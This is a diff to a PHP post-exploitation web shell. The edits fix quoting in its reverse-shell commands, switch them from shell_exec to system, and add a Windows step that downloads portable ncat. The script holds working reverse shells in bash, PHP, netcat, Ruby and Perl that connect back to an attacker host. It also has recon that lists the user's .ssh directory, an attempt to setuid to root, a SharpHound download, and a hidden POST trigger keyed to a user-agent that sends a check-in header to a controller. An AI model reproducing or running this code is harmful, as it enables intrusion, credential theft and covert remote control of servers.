@@ -1,5 +1,8 @@
 <?php
-$base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
+ini_set("safe_mode", 0);
+umask(0);
+posix_setuid(0);
+define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
 
 
 function banner(){
@@ -224,6 +227,7 @@ function checkSystem()
         windows("bh", "dl");
         windows("azh", "dl");
         windows("bhe", "dl");
+        windows("ncW", "dl");
         return $os;
     } else {
         array_push($os,"Linux");
@@ -245,7 +249,7 @@ function showEnv($os)
     return null;
 }
 
-function reverseConnections(string $methods, string $host, int $port, string $shell)
+function reverseConnections($methods, $host, $port, $shell)
 {
 //    $errorNum = error;
     $defaultPort = 1634;
@@ -275,23 +279,23 @@ function reverseConnections(string $methods, string $host, int $port, string $sh
         $usePort = $port;
     }
     $comma = array(
-        "bash" => "nohup bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1 &",
-        "php" => "nohup php -r '\$sock=fsockopen(" . $useHost . "," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
-        "nc" => "nohup nc -e " . $useShell . " " . $useHost . " " . $usePort . " &",
-        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc " . $useHost . " " . $usePort . " >/tmp/f &",
-        "ruby" => "nohup ruby -rsocket -e'f=TCPSocket.open(" . $useHost . "," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' &",
-        "perl" => "nohup perl -e 'use Socket;\$i=" . $useHost . ";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &",
+        "bash" => "nohup bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1",
+        "php" => "nohup php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
+        "nc" => "nohup nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort,
+        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
+        "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
     );
     $defaultAction = $comma["bash"];
     if (!empty($methods)) {
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
 
-        shell_exec($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
+        system($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
         echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-        shell_exec($defaultAction) or die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
+        system($defaultAction) or die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
     }
 }
 
@@ -331,6 +335,12 @@ function windows($com, $r){
                     echo("Pulling Bloodhound Executable!\n");
                     shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
                     echo("\nFile downloaded to: ". $cdir . " af2.ps1");
+                    break;
+                case "ncW":
+                    echo("Pulling Ncat Executable!\n");
+                    shell_exec("Invoke-WebRequest -Uri http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile nc1.zip");
+                    shell_exec("Expand-Archive ncat-portable-5.59BETA1.zip $cdir");
+                    echo("\nFile expanded to: ". $cdir);
                     break;
             }
         }else{
@@ -385,7 +395,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         elseif ($_GET["qs"] == "cqCM")
             checkComs();
         elseif ($_GET["qs"] == "cqBS")
-            executeCommands($base, "1");
+            executeCommands(base, "1");
     } else {
         if (!empty($CHECK_IN_HOST)) {
             header("Checkin: " . $CHECK_IN_HOST);
